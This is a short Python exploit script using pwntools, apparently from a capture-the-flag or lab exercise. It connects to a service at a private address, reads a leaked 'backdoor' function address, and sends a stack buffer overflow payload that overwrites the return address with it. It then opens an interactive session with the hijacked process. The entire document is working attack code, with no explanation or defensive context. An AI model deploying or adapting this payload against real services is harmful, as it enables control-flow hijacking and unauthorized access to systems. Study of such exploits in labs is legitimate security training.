from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

r = remote('192.168.10.107', 1234)

r.recvuntil('0x')
backdoor_addr = int(r.recv(8), 16)
li('backdoor_addr = ' + hex(backdoor_addr))
pause()
p1 = b'a' * (0x64 - 0xc) + p32(backdoor_addr)
r.sendline(p1)

#sleep(1)
#r.sendline('calc')
r.interactive()